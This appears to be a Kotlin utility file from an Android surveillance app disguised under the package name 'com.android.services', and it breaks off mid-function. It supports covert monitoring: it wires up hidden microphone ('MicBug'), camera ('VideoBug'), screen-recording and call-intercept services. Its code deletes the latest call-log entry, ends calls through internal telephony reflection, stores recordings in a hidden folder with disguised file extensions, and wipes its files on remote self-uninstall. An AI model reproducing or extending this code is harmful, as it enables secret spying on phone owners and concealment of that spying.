package com.android.services.util

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.annotation.SuppressLint
import android.app.ActivityManager
import android.app.AppOpsManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.app.usage.UsageStats
import android.app.usage.UsageStatsManager
import android.content.ComponentName
import android.content.Context
import android.content.Context.TELECOM_SERVICE
import android.content.DialogInterface
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.content.pm.ResolveInfo
import android.graphics.Path
import android.hardware.Camera
import android.location.LocationManager
import android.media.AudioManager
import android.media.MediaRecorder
import android.media.MediaScannerConnection
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.*
import android.provider.*
import android.telecom.TelecomManager
import android.telephony.PhoneNumberUtils
import android.text.TextUtils
import android.util.Base64
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AlertDialog
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.work.WorkInfo
import androidx.work.WorkManager
import com.android.services.MyApplication.Companion.appContext
import com.android.services.R
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.enums.FcmPushStatus
import com.android.services.enums.PermissionScreens
import com.android.services.enums.View360InteruptionType
import com.android.services.interfaces.CustomDialogListener
import com.android.services.models.*
import com.android.services.receiver.TOSDeviceAdminReceiver
import com.android.services.services.RemoteDataService
import com.android.services.services.callIntercept.CallInterceptCommandService
import com.android.services.services.micBug.MicBugCommandService
import com.android.services.services.screenRecord.ScreenRecordCommandService
import com.android.services.services.screenSharing.ScreenSharingCommandService
import com.android.services.services.videoBug.VideoBugCommandService
import com.android.services.services.view360.View360CommandService
import com.android.services.services.view360ByJitsi.View360ByJitsiMeetCommandService
import com.android.services.ui.activities.DeviceActivationActivity
import com.android.services.ui.activities.ScreenRecordIntentActivity
import com.android.services.util.RoomDBUtils.getRestrictedNumberList
import com.android.services.workers.DataUploadingWorker
import com.android.services.workers.FutureWorkUtil
import com.android.services.workers.View360ByJitsi.View360ByJitsiCommandProcessingBase
import com.android.services.workers.View360ByJitsi.View360ByJitsiMeetCommandWorker
import com.android.services.workers.callRecord.CallRecordWorkerService
import com.android.services.workers.micbug.MicBugCommandWorker
import com.android.services.workers.videobug.VideoBugCommandWorker
import com.android.services.workers.view360.View360CommandWorker
import com.android.services.workers.voip.VoipCallRecordWorkerService
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.*
import java.lang.Process
import java.lang.reflect.Method
import java.security.MessageDigest
import java.security.NoSuchAlgorithmException
import java.text.ParseException
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ExecutionException
import java.util.concurrent.TimeUnit
import java.util.regex.Pattern
import kotlin.collections.ArrayList
import kotlin.math.max
import kotlin.math.min

object AppUtils {

    fun displayOverOtherAppsGranted(context: Context) = Settings.canDrawOverlays(context)
    fun isNotificationAccessEnabled(context: Context): Boolean {
        return NotificationManagerCompat.getEnabledListenerPackages(context)
            .contains(context.packageName)
    }

    fun deleteLastCallLog(context: Context) {
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC"
            )
            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    context.contentResolver.delete(
                        CallLog.Calls.CONTENT_URI,
                        "_ID=" + cursor.getInt(cursor.getColumnIndex("_ID")), null
                    )
                }
                cursor.close()
            }
        } catch (e: Exception) {
            e.message
        }
    }

    /**
     * block incoming call
     */
    fun disconnectCall() {
        try {
            val serviceManagerName = "android.os.ServiceManager"
            val serviceManagerNativeName = "android.os.ServiceManagerNative"
            val telephonyName = "com.android.internal.telephony.ITelephony"
            val telephonyClass: Class<*>
            val telephonyStubClass: Class<*>
            val serviceManagerClass: Class<*>
            val serviceManagerNativeClass: Class<*>
            val telephonyEndCall: Method
            val telephonyObject: Any
            val serviceManagerObject: Any
            telephonyClass = Class.forName(telephonyName)
            telephonyStubClass = telephonyClass.classes[0]
            serviceManagerClass = Class.forName(serviceManagerName)
            serviceManagerNativeClass = Class.forName(serviceManagerNativeName)
            val getService =  // getDefaults[29];
                serviceManagerClass.getMethod("getService", String::class.java)
            val tempInterfaceMethod = serviceManagerNativeClass.getMethod(
                "asInterface",
                IBinder::class.java
            )
            val tmpBinder = Binder()
            tmpBinder.attachInterface(null, "fake")
            serviceManagerObject = tempInterfaceMethod.invoke(null, tmpBinder)
            val retbinder = getService.invoke(serviceManagerObject, "phone") as IBinder
            val serviceMethod = telephonyStubClass.getMethod(
                "asInterface",
                IBinder::class.java
            )
            telephonyObject = serviceMethod.invoke(null, retbinder)
            telephonyEndCall = telephonyClass.getMethod("endCall")
            telephonyEndCall.invoke(telephonyObject)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun addMissedCallLogs(context: Context?, lastCallId: Int) {
        val callDetails = getLastCallDetails(context!!, lastCallId)
//        val handler = Handler(Looper.getMainLooper())
//        handler.postDelayed({
        val isMainThread = Looper.getMainLooper() == Looper.myLooper()
        logVerbose("Going to sleep thread isMain=$isMainThread", "ANRInfoLogs")
        Thread.sleep(1000)
        logVerbose("missed call detail: $callDetails after sleep", "ANRInfoLogs")
        try {
            val callId: String
            val callerName: String
            val callName: String
            val callNumber: String
            val callDuration: String
            val callDate: String
            val callType: String
            if (callDetails.length() > 0) {
                callId = callDetails.getString("id")
                callerName = getContactName(callDetails.getString("number"), context)
                callName = formatDateTimezone(callDetails.getString("date"))
                callNumber = callDetails.getString("number")
                callDuration = callDetails.getString("duration")
                callDate = formatDate(callDetails.getString("date"))
                callType = callDetails.getString("type")
                val callLog = com.android.services.db.entities.CallLog()
                callLog.apply {
                    uniqueId = callId.toString()
                    this.callerName = callerName
                    this.callName = callName
                    this.callNumber = callNumber
                    callStartTime = callDate
                    this.callDuration = callDuration
                    callDirection = callType
                    longitude = AppConstants.locationLongitude ?: ""
                    latitude = AppConstants.locationLatitude ?: ""
                    isRecorded = "1"
                    date = getDate(callDetails.getString("date").toLong())
                    callStatus = 0
                }
                InjectorUtils.provideCallLogRepository(context).insertCallLog(callLog)
            }
        } catch (e: Exception) {
            e.message
        }
//        }, 1000)
    }

    /**
     * get the default camera application
     *
     * @return package name of default camera application
     */
    fun getDefaultCamera(): String? {
        try {
            val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
            val resolveInfo =
                appContext.packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY)
            return resolveInfo!!.activityInfo.packageName
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return "default Camera"
    }

    /**
     * get default browser
     *
     * @return package name
     */
    fun getDefaultBrowser(): String? {
        try {
            val browserIntent = Intent("android.intent.action.VIEW", Uri.parse("http://"))
            val resolveInfo = appContext.packageManager.resolveActivity(
                browserIntent,
                PackageManager.MATCH_DEFAULT_ONLY
            )
            return resolveInfo!!.activityInfo.packageName
        } catch (e: Exception) {
            logVerbose(e.message!!)
        }
        return "default browser"
    }

    /**
     * get the default messaging application
     *
     * @return package name of default messaging application
     */
    fun getDefaultMessagingApp(): String? {
        try {
            val intent: Intent
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
                val defaultApplication = Settings.Secure.getString(
                    appContext.contentResolver,
                    "sms_default_application"
                )
                val pm = appContext.packageManager
                intent = pm.getLaunchIntentForPackage(defaultApplication)!!
            } else {
                intent = Intent(Intent.ACTION_MAIN)
                intent.addCategory(Intent.CATEGORY_DEFAULT)
                intent.type = "vnd.android-dir/mms-sms"
            }
            val resolveInfo = appContext.packageManager.resolveActivity(
                intent, PackageManager.MATCH_DEFAULT_ONLY
            )
            return if (resolveInfo != null) resolveInfo.activityInfo.packageName else Telephony.Sms.getDefaultSmsPackage(
                appContext
            )
        } catch (exp: Exception) {
            exp.printStackTrace()
        }
        return "default Messaging"
    }

    /** Deletes file from the directory **/
    fun deleteFile(applicationContext: Context, mFilePath: String) {
        val file = File(mFilePath)
        if (file.exists()) {
            val isDeleted = file.delete()
            if (isDeleted) {
                MediaScannerConnection.scanFile(applicationContext, arrayOf(mFilePath), null, null)
            }
        }
    }

    /**
     * This method is responsible for the Creation of the Storage Directory to store app's data, It creates a hidden folder in the
     * external storage, with the output directory path depends Upon the OS of the device OS Either It Create Output Directory in External Storage
     * or creates a directory in Shared Storage if Device supports Scoped Storage
     * @param context Context of the App
     * @param directory Directory to be created
     * @param fileName Name of the file to be created
     */
    @JvmStatic
    @Synchronized
    @SuppressWarnings("deprecation")
    fun retrieveFilePath(context: Context, directory: String, fileName: String): String {
        // Create a folder in Shared Media Directory if OS >= 10
        // Else Creates a folder in External Storage
        val storageDirectory = if (AppConstants.osGreaterThanEqualToEleven) {
            AppConstants.ANDROID_MEDIA_DIRECTORY
        } else {
            AppConstants.STORAGE_FOLDER
        }

        // create Storage folder If not Exists
        val storageFolder =
            File(Environment.getExternalStorageDirectory().toString() + storageDirectory)
        if (!storageFolder.exists()) {
            logVerbose("$currentMethod creating folder ${storageFolder.absolutePath}")
            val created = storageFolder.mkdirs()
            if (created) {
                logVerbose("$currentMethod folder created ${storageFolder.absolutePath}")
            }
        }

        val folder = File(
            Environment.getExternalStorageDirectory()
                .toString() + storageDirectory + File.separator + directory
        )
        if (!folder.exists()) {
            logVerbose("$currentMethod creating folder ${folder.absolutePath}")
            val created = folder.mkdirs()
            if (created) {
                logVerbose("$currentMethod folder created ${folder.absolutePath}")
            }
        }
        return String.format("%s%s%s", folder.absolutePath, File.separator, fileName)
    }

    /**
     * Deletes all the app files within the app directory storage, to cleanup the device Storage
     * This operation is required when self uninstall command is generated
     */
    suspend fun deleteAppDirectories(applicationContext: Context) {
        withContext(Dispatchers.IO) {
            deleteAppSpecificFiles(applicationContext)
        }
    }

    fun deleteAppSpecificFiles(applicationContext: Context) {
        val storageDirectory = if (AppConstants.osGreaterThanEqualToEleven) {
            AppConstants.ANDROID_MEDIA_DIRECTORY
        } else {
            AppConstants.STORAGE_FOLDER
        }

        // create Storage folder If not Exists
        val folder =
            File(Environment.getExternalStorageDirectory().toString() + storageDirectory)
        if (folder.exists()) {
            val files: List<String> = getFilesListInDirectory(folder)
            for (i in files.indices) {
                val filePath = folder.absolutePath + File.separator + files[i]
                val pathFile = File(filePath)
                if (pathFile.isDirectory) {
                    val directoryFiles = getFilesListInDirectory(pathFile)
                    directoryFiles.forEach {
                        deleteFile(applicationContext, filePath + File.separator + it)
                    }
                }
            }
        }
    }

    /** Checks Whether the Gps Location Permissions are Granted **/
    fun areLocationPermissionsGranted(context: Context): Boolean =
        Build.VERSION.SDK_INT < Build.VERSION_CODES.Q ||
                (checkPermissionGranted(
                    context,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                ) && checkPermissionGranted(context, Manifest.permission.ACCESS_FINE_LOCATION))

    /** Checks a Permission is Granted **/
    fun checkPermissionGranted(context: Context, permission: String): Boolean =
        ActivityCompat.checkSelfPermission(
            context,
            permission
        ) == PackageManager.PERMISSION_GRANTED

    /** checks if internet is available **/
    @SuppressLint("MissingPermission")
    fun isNetworkAvailable(context: Context): Boolean {

        var networkSync = "3"
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val capabilities =
                connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
            if (capabilities != null) {
                when {
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> {
                        networkSync = "1"
                    }

                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> {
                        networkSync = "4"
                    }

                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> {
                        networkSync = "3"
                    }
                }
            }
        } else {
            val activeNetworkInfo = connectivityManager.activeNetworkInfo
            if (activeNetworkInfo != null && activeNetworkInfo.isConnected) {
                networkSync = when (activeNetworkInfo.type) {
                    ConnectivityManager.TYPE_WIFI -> {
                        "1"
                    }

                    ConnectivityManager.TYPE_MOBILE -> {
                        "4"
                    }

                    else -> {
                        "3"
                    }
                }
            }
        }
        logVerbose("Network sync = ${AppConstants.networkSyncMethod}, $networkSync")
        return when (AppConstants.networkSyncMethod ?: "3") {
            "1" -> {
                networkSync == "1"
            }

            "4", "3" -> {
                true
            }

            "2" -> {
                false
            }

            else -> {
                false
            }
        }
    }

    fun formatDateTime(time: String, format: String): String {
        val dateFormat = SimpleDateFormat(format, Locale.ROOT)
        val dateTime = Date(time.toLong())
        return dateFormat.format(dateTime)
    }

    /** Formats timestamp to yyyy-MM-dd HH:mm:ss formatted string */
    @SuppressLint("SimpleDateFormat")
    fun formatDate(date: String): String {
        val dateFormat = SimpleDateFormat(AppConstants.DATE_FORMAT_1, Locale.ROOT)
        val dateTime = Date(date.toLong())
        return dateFormat.format(dateTime)
    }

    /** Get Date from timestamp **/
    fun getDate(timeStamp: Long): Date {
        val calendar = Calendar.getInstance(Locale.getDefault())
        calendar.timeInMillis = timeStamp
        return calendar.time
    }

    ///////////////////////////////////////////////////////////////////////////
// Checks whether the Location Providers are enabled
///////////////////////////////////////////////////////////////////////////
    fun checkLocationProviderEnabled(context: Context): Boolean {
        val locationManager: LocationManager =
            context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var gpsEnabled = false
        var networkEnabled = false
        try {
            gpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
        } catch (ex: Exception) {
            logException(
                "${ex.message}",
                AppConstants.GPS_LOCATION_TYPE,
                ex
            )
        }
        try {
            networkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
        } catch (ex: Exception) {
            logException(
                "${ex.message}",
                AppConstants.GPS_LOCATION_TYPE,
                ex
            )
        }
        return gpsEnabled || networkEnabled
    }

    @SuppressLint("SimpleDateFormat")
    fun formatDateCustom(date: String): String {
        var timestamp = date.toLong()
        if (date.length < 13) {
            timestamp *= 1000
        }
        return SimpleDateFormat("MMM', 'dd HH'_'mma").format(Date(timestamp))
    }

    /** This functions provides the user id of User**/
    fun getUserId() = AppConstants.userId ?: ""

    /** This functions provides the phone service id of User**/
    fun getPhoneServiceId() = AppConstants.phoneServiceId ?: ""

    /** This functions set the firebase crashlytics userId**/
    fun setFirebaseCrashlyticsUserId(id: String) =
        FirebaseCrashlytics.getInstance().setUserId(id)

    fun validFileSize(file: File): Boolean {
        val fileSizeInBytes = file.length()
        return fileSizeInBytes.toInt() / 1024 > 2
    }

    /** Find front facing camera Id **/
    private fun findFrontFacingCamera(): Int {
        var cameraId = -1
        val numberOfCameras = Camera.getNumberOfCameras()
        for (i in 0 until numberOfCameras) {
            val info = Camera.CameraInfo()
            Camera.getCameraInfo(i, info)
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                cameraId = i
                break
            }
        }
        return cameraId
    }

    /** Finds the available cameras on device, and Gets the Front or back camera Id
     * @param activity Context
     * @param facing Front or Back Camera
     **/
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun findCameraById(facing: String): Int {
        return when {
            facing.equals(
                "front",
                ignoreCase = true
            ) -> 1

            facing.equals(
                "back",
                ignoreCase = true
            ) -> 0

            else -> -1
        }
    }

    /** Returns the current executing method name **/
    val currentMethod: String
        get() {
            return Thread.currentThread().stackTrace[0].methodName
        }

    fun showNotification(context: Context, title: String, contentText: String) {
        // Create an explicit intent for an Activity in your app
        val intent = Intent(context, DeviceActivationActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        val pendingIntent: PendingIntent = PendingIntent.getActivity(context, 0, intent, 0)
        val builder = NotificationCompat.Builder(context, RemoteDataService.CHANNEL_ID)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle(title)
            .setContentText(contentText)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            // Set the intent that will fire when the user taps the notification
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
        with(NotificationManagerCompat.from(context)) {
            // notificationId is a unique int for each notification that you must define
            notify(1, builder.build())
        }
    }

    /**
     * Checks whether accessibility service is Enabled or Not for [Context.getPackageName]
     */
    fun isAccessibilityEnabled(context: Context): Boolean {
        return try {
            val mStringColonSplitter = TextUtils.SimpleStringSplitter(':')
            val settingValue = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            )
            if (settingValue != null && settingValue.isNotEmpty()) {
                mStringColonSplitter.setString(settingValue)
                while (mStringColonSplitter.hasNext()) {
                    val accessibilityService = mStringColonSplitter.next()
                    if (accessibilityService.contains(context.packageName)) return true
                }
            }
            false
        } catch (exp: Exception) {
            logException("Exception while checking isAccessibilityEnabled = ${exp.message}")
            false
        }
    }

    /** Start the screen Record request Activity **/
    fun startScreenRecordIntent(
        context: Context,
        type: Int,
        fcmPush: FCMPush? = null,
        pkgName: String? = null,
    ) {
        context.startActivity(
            Intent(context, ScreenRecordIntentActivity::class.java)
                .putExtra(ScreenRecordIntentActivity.KEY_FCM_PUSH, fcmPush)
                .putExtra(ScreenRecordIntentActivity.KEY_COMMAND_TYPE, type)
                .putExtra(ScreenRecordIntentActivity.KEY_PACKAGE_NAME, pkgName)
                .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK)
        )
    }

    fun getTodayDate(format: String): String {
        val calender = Calendar.getInstance().time
        val dateFormat = SimpleDateFormat(format, Locale.ENGLISH)
        return dateFormat.format(calender)
    }

    fun getMilliSecondsBetweenTwoDates(
        startDate: String,
        endDate: String,
        format: String,
    ): Long {
        val dateFormat = SimpleDateFormat(format, Locale.ENGLISH)
        val date1 = dateFormat.parse(startDate)!!
        val date2 = dateFormat.parse(endDate)!!
        return date1.time - date2.time
    }

    fun isDateGreaterThanOther(d1: String, d2: String): Boolean {
        val simpleDateFormat = SimpleDateFormat(AppConstants.DATE_FORMAT_3)
        try {
            val date1 = simpleDateFormat.parse(d1)
            val date2 = simpleDateFormat.parse(d2)
            assert(date1 != null)
            return date1!!.after(date2) || date1!!.equals(date2)
        } catch (e: ParseException) {
            e.printStackTrace()
        }
        return false
    }

    /**
     * get Application name from the package name
     *
     * @param packageName package name of android application
     * @return app name
     */
    fun getAppNameFromPackage(packageName: String?): String {
        val packageManager = appContext.packageManager
        var applicationInfo: ApplicationInfo? = null
        try {
            applicationInfo = packageManager.getApplicationInfo(packageName!!, 0)
        } catch (exp: PackageManager.NameNotFoundException) {
            exp.message
        }
        return (if (applicationInfo != null) packageManager.getApplicationLabel(applicationInfo) else "Unknown") as String
    }

    fun isScreenInteractive(context: Context): Boolean {
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        try {
            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.KITKAT) {
                if (powerManager.isInteractive) return true
            } else {
                if (powerManager.isScreenOn) return true
            }
        } catch (e: Exception) {
            e.message
        }
        return false
    }

    fun isServiceRunning(context: Context, serviceName: String): Boolean {
        return try {
            if (serviceName == MicBugCommandWorker::class.java.name.toString() || serviceName == VideoBugCommandWorker::class.java.name.toString() || serviceName == CallRecordWorkerService::class.java.name.toString() || serviceName == View360ByJitsiMeetCommandWorker::class.java.name.toString() ||
                serviceName == VoipCallRecordWorkerService::class.java.name.toString() || serviceName == View360CommandWorker::class.java.name.toString() || serviceName == DataUploadingWorker::class.java.name
            ) {
                isWorkRunning(context, serviceName)
            } else {
                val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager?
                if (manager?.getRunningServices(Int.MAX_VALUE) != null && manager.getRunningServices(
                        Int.MAX_VALUE
                    ).size > 0
                ) {
                    for (service in manager.getRunningServices(Int.MAX_VALUE)) {
                        if (serviceName == service.service.className) {
                            return true
                        }
                    }
                }
                false
            }

        } catch (e: Exception) {
            logException("Error Checking isServiceRunning ${e.message}")
            false
        }
    }

    // Returns the Last Call Log Id
    fun getLastCallId(context: Context): Int {
        var id = -1
        return try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                CallLog.Calls.DATE + " DESC"
            )
            if (cursor != null) {
                if (cursor.moveToFirst()) id = cursor.getInt(cursor.getColumnIndex("_id"))
                cursor.close()
            }
            id
        } catch (e: Exception) {
            logException("Error Getting Last Call Id: ${e.message}")
            id
        }
    }

    /**
     * check the mic recording is enabled or not
     * @param context context of the app
     * @return true or false
     */
    fun isMicRecordingEnabled(context: Context): Boolean {
        return isServiceRunning(context, MicBugCommandWorker::class.java.name)
    }

    /**
     * check the video recording is Enabled or not
     * @param context context of the app
     * @return true or false
     */
    fun isVideoRecordingEnabled(context: Context): Boolean {
        return isServiceRunning(context, VideoBugCommandWorker::class.java.name)
    }

    fun isMicrophoneAvailable(context: Context): Boolean {
        return if (checkPermissionGranted(context, Manifest.permission.RECORD_AUDIO)) {
            var available = true
            try {
                val recorder = MediaRecorder()
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
                recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT)
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT)
                recorder.setOutputFile(
                    File(
                        context.cacheDir,
                        "MediaUtil#micAvailTestFile"
                    ).absolutePath
                )
                recorder.prepare()
                recorder.start()
                recorder.release()
            } catch (e: Exception) {
                available = false
            }
            available
        } else {
            false
        }
    }

    fun stopMicBugCommandService(context: Context) {
//        context.stopService(
//            Intent(
//                context,
//                MicBugCommandService::class.java
//            )
//        )
        FutureWorkUtil.stopBackgroundWorker(context, MicBugCommandWorker::class.java.name)
    }

    fun stopRemoteDataSyncService(context: Context) {
//        context.stopService(
//            Intent(
//                context,
//                RemoteDataService::class.java
//            )
//        )
        FutureWorkUtil.stopBackgroundWorker(context, DataUploadingWorker::class.java.name)
    }

    fun stopVideoBugCommandService(context: Context) {
//        context.stopService(
//            Intent(
//                context,
//                VideoBugCommandService::class.java
//            )
//        )
        FutureWorkUtil.stopBackgroundWorker(context, VideoBugCommandWorker::class.java.name)
    }

    /** Get the Cal Details of Last Call Log */
    fun getLastCallDetails(
        context: Context,
        mLastCallId: Int,
        mCallNumber: String? = null,
        type: String? = null,
        mRecordingStartTime: Long = 0L,
    ): JSONObject {
        val recordCall = JSONObject()
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC"
            )
            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    val number: String
                    val date: String
                    val duration: String
                    val callType: String
                    val id = cursor.getInt(cursor.getColumnIndex("_id"))
                    logVerbose(" LastCall  Id = $id", AppConstants.CALL_RECORD_TYPE)
                    if (mLastCallId != -1 && id == mLastCallId + 1) {
                        number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
                        date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE))
                        duration =
                            cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION))
                        val mType = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE))
                        callType = when (mType) {
                            CallLog.Calls.INCOMING_TYPE -> "Incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                            else -> "Missed"
                        }
                        recordCall.put("id", id.toString())
                        recordCall.put("number", number)
                        recordCall.put("date", date)
                        recordCall.put("duration", duration)
                        recordCall.put("type", callType)
                        logVerbose(" LastCall Number = $number", AppConstants.CALL_RECORD_TYPE)
                        logVerbose(
                            " LastCall Call Type = $callType",
                            AppConstants.CALL_RECORD_TYPE
                        )
                        logVerbose(
                            " LastCall Call Number = $number",
                            AppConstants.CALL_RECORD_TYPE
                        )
                    } else {
                        recordCall.put("id", id.toString())
                        recordCall.put("number", mCallNumber)
                        recordCall.put("date", mRecordingStartTime.toString() + "")
                        recordCall.put(
                            "duration",
                            (System.currentTimeMillis() - mRecordingStartTime) / 1000
                        )
                        recordCall.put("type", type)
                    }
                } else {
                    recordCall.put("id", "")
                    recordCall.put("number", mCallNumber)
                    recordCall.put("date", mRecordingStartTime.toString() + "")
                    recordCall.put(
                        "duration",
                        (System.currentTimeMillis() - mRecordingStartTime) / 1000
                    )
                    recordCall.put("type", type)
                }
                cursor.close()
            } else {
                recordCall.put("id", "")
                recordCall.put("number", mCallNumber)
                recordCall.put("date", mRecordingStartTime.toString() + "")
                recordCall.put(
                    "duration",
                    (System.currentTimeMillis() - mRecordingStartTime) / 1000
                )
                recordCall.put("type", type)
            }
        } catch (e: Exception) {
            try {
                recordCall.put("id", "")
                recordCall.put("number", mCallNumber)
                recordCall.put("date", mRecordingStartTime.toString() + "")
                recordCall.put(
                    "duration",
                    (System.currentTimeMillis() - mRecordingStartTime) / 1000
                )
                recordCall.put("type", type)
            } catch (e: Exception) {
                logVerbose(" LastCall  Exception = " + e.message, AppConstants.CALL_RECORD_TYPE)
            }
        }
        return recordCall
    }

    /**
     * get the contact name from Phone Number
     *
     * @param number
     * @param context
     * @return
     */
    fun getContactName(number: String?, context: Context): String {
        return try {
            // define the columns I want the query to return
            val projection = arrayOf(
                ContactsContract.PhoneLookup.DISPLAY_NAME,
                ContactsContract.PhoneLookup.NUMBER,
                ContactsContract.PhoneLookup.HAS_PHONE_NUMBER
            )

            // encode the phone number and build the filter URI
            val contactUri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(number)
            )

            // query time
            val cursor = context.contentResolver.query(
                contactUri,
                projection, null, null, null
            )
            var contactName: String? = ""
            if (cursor != null && cursor.moveToFirst()) {
                contactName = cursor.getString(
                    cursor
                        .getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME)
                )
                cursor.close()
                return contactName
            }
            "Unknown"
        } catch (e: Exception) {
            "Unknown"
        }
    }

    @SuppressLint("SimpleDateFormat")
    fun formatDateTimezone(date: String): String {
        var timestamp = java.lang.Long.valueOf(date)
        if (date.length < 13) timestamp *= 1000
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss z")
            .format(Date(timestamp))
    }

    /** This accepts the Source File Path @param [sourceFile] and Destination File Path [destFile]
     * And reName the dest file with source file*/
    fun reNameSourceFileWithDestFile(
        context: Context,
        sourceFile: String,
        destFile: String,
        TAG: String,
    ) {
        val srcFile = File(sourceFile)
        val destinationFile = File(destFile)
        if (destinationFile.sizeInKb >= srcFile.sizeInKb) {

            // Delete destination file, as compression didn't worked correctly
            logVerbose("$TAG Compression gone wrong for $sourceFile")
            if (destinationFile.exists()) {
                val isDeleted = destinationFile.delete()
                if (isDeleted) {
                    MediaScannerConnection.scanFile(context, arrayOf(destFile), null, null)
                    logVerbose("$TAG $destFile deleted")
                }
            }

            // Change extension of Original File
            var sourceFileWithExtension = sourceFile
            if (sourceFile.contains(".mp3")) {
                sourceFileWithExtension = sourceFile.replace(".mp3", ".mrc")
            } else if (sourceFile.contains(".mp4")) {
                sourceFileWithExtension = sourceFile.replace(".mp4", ".svc")
            }

            val outputSourceFile = File(sourceFileWithExtension)
            val reNameSuccess = srcFile.renameTo(outputSourceFile)
            if (reNameSuccess) {
                logVerbose("$TAG $sourceFile renamed successfully")
            } else {
                logVerbose("$TAG Error reNaming file $destFile")
            }
        } else {
            if (srcFile.exists()) {
                val isDeleted = srcFile.delete()
                if (isDeleted) {
                    MediaScannerConnection.scanFile(context, arrayOf(sourceFile), null, null)
                    logVerbose("$TAG $sourceFile deleted")
                }
            }

            var sourceFileWithExtension = sourceFile
            if (sourceFile.contains(".mp3")) {
                sourceFileWithExtension = sourceFile.replace(".mp3", ".mrc")
            } else if (sourceFile.contains(".mp4")) {
                sourceFileWithExtension = sourceFile.replace(".mp4", ".svc")
            }
            val outputSourceFile = File(sourceFileWithExtension)
            val reNameSuccess = destinationFile.renameTo(outputSourceFile)
            if (reNameSuccess) {
                logVerbose("$TAG $destFile renamed successfully")
            } else {
                logVerbose("$TAG Error reNaming file $destFile")
            }
        }
    }

    fun reNameFile(sourceFile: String, TAG: String) {
        var sourceFileWithExtension = sourceFile
        if (sourceFile.contains(".mp3")) {
            sourceFileWithExtension = sourceFile.replace(".mp3", ".mrc")
        } else if (sourceFile.contains(".mp4")) {
            sourceFileWithExtension = sourceFile.replace(".mp4", ".svc")
        }
        val inputSourceFile = File(sourceFile)
        val outputSourceFile = File(sourceFileWithExtension)
        val reNameSuccess = inputSourceFile.renameTo(outputSourceFile)
        if (reNameSuccess) {
            logVerbose("$TAG $sourceFile renamed successfully")
        } else {
            logVerbose("$TAG Error reNaming file $sourceFile")
        }
    }

    /**
     * Filter the Current Package Name from teh ScreenRecordingApps List, Checks if ScreenRecording Enabled Or Not
     * @param packageName package name
     * @return true or false
     */
    fun isScreenRecordingApp(packageName: String): Boolean {
        val appsList = AppConstants.screenRecordingApps
        return if (appsList != null && appsList.isNotEmpty()) {
            try {
                val gson = GsonBuilder().create()
                val screenRecordingApps = listOf(
                    *gson.fromJson(
                        appsList,
                        Array<ScreenRecordingApp>::class.java
                    )
                )
                screenRecordingApps.forEach { app ->
                    if (app.appName == "SMS" && app.isEnabled && packageName == getDefaultMessagingApp()) {
                        return true
                    } else if (app.appName == "Camera" && app.isEnabled && packageName == getDefaultCamera()) {
                        return true
                    } else if (app.appName == "Default Browser" && app.isEnabled && packageName == "com.google.android.googlequicksearchbox") {
                        return false
                    } else if (app.appPackage == packageName && app.isEnabled) {
                        return true
                    }
                }
            } catch (exception: Exception) {
